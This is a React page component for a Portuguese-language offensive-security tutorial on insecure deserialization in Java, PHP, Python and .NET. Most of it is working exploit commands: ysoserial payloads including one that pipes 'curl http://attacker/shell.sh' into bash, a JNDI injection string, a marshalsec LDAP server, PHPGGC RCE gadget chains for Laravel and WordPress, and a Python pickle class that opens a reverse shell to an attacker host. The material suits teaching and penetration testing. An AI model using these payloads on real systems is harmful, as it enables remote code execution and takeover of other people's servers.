import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function Deserialization() {
  return (
    <PageContainer
      title="Insecure Deserialization"
      subtitle="Explore vulnerabilidades de deserialização insegura em Java, PHP, Python e .NET para obter execução remota de código."
      difficulty="avancado"
      timeToRead="16 min"
    >
      <h2>O que é Deserialization?</h2>
      <p>
        <strong>Serialização</strong> converte objetos em bytes para transporte/armazenamento.
        <strong>Deserialização</strong> reconstrói o objeto a partir dos bytes. Quando uma aplicação
        deserializa dados não confiáveis, um atacante pode injetar objetos maliciosos que executam
        código durante a reconstrução.
      </p>

      <h2>Identificar Serialização</h2>
      <CodeBlock
        title="Detectar dados serializados"
        code={`# Java Serialized Objects
# Começa com: AC ED 00 05 (hex) ou rO0AB (base64)
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | xxd | head

# PHP Serialized
# Formato: O:4:"User":2:{s:4:"name";s:5:"admin";...}
# a:2:{} = array, O:4:{} = objeto, s:5: = string

# Python Pickle
# Começa com: \\x80\\x04\\x95 (protocol 4)
# Ou base64 de pickle

# .NET ViewState
# __VIEWSTATE= no HTML (base64)

# Node.js
# JSON com __proto__ ou constructor

# Ruby
# Marshal.dump — começa com \\x04\\x08`}
      />

      <h2>Java Deserialization</h2>
      <CodeBlock
        title="Explorar Java deserialization"
        code={`# ysoserial — gerar payloads Java
# https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections1 'whoami' > payload.bin

# Gadget chains populares:
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1
# Spring1-2
# Hibernate1
# JRMPClient

# Enviar payload
# Via cookie de sessão Java (JSESSIONID)
# Via body de POST
# Via parâmetro serializado

# Exemplo com curl
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/shell.sh|bash' | base64 -w0
# Inserir base64 no parâmetro vulnerável

# Detectar gadgets disponíveis
# GadgetProbe
java -jar GadgetProbe.jar -t http://alvo.com/deserialize

# JNDI Injection (Log4Shell style)
# Se o app usa lookup JNDI
\${jndi:ldap://attacker:1389/exploit}

# Ferramentas
# JexBoss — testa JBoss/Java
python jexboss.py -u http://alvo.com

# marshalsec — servidor JNDI/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"`}
      />

      <h2>PHP Deserialization</h2>
      <CodeBlock
        title="Explorar PHP deserialization"
        code={`# PHP unserialize() com classes vulneráveis
# Métodos mágicos exploráveis:
# __wakeup()   — chamado na deserialização
# __destruct() — chamado quando objeto é destruído
# __toString() — chamado em conversão para string

# Payload básico
O:4:"User":1:{s:4:"role";s:5:"admin";}

# RCE via POP chain
# Precisa encontrar gadget chain no código-fonte
# Ferramentas:
# PHPGGC — gadget chains para frameworks PHP
git clone https://github.com/ambionics/phpggc
cd phpggc

# Listar gadgets disponíveis
./phpggc -l

# Gerar payload (exemplo Laravel)
./phpggc Laravel/RCE1 system 'id' -b
# -b = base64 output

# Gerar para WordPress
./phpggc WordPress/RCE1 system 'whoami'

# Phar deserialization
# Arquivos .phar podem triggar unserialize()
# Via file operations: file_exists(), include, fopen
# phar://malicious.phar/test.txt`}
      />

      <h2>Python Pickle</h2>
      <CodeBlock
        title="Explorar Python pickle"
        code={`# Python pickle é SEMPRE perigoso com dados não confiáveis
# pickle.loads() executa código arbitrário

# Payload de RCE
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(payload.hex())

# Payload de reverse shell
class ReverseShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.call, 
                (['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'],))

# Enviar via cookie, API, ou qualquer lugar que use pickle
import base64
print(base64.b64encode(pickle.dumps(ReverseShell())).decode())

# Detecção: procurar por
# pickle.loads(), pickle.load()
# yaml.load() (sem Loader=SafeLoader)
# jsonpickle.decode()`}
      />
    </PageContainer>
  );
}
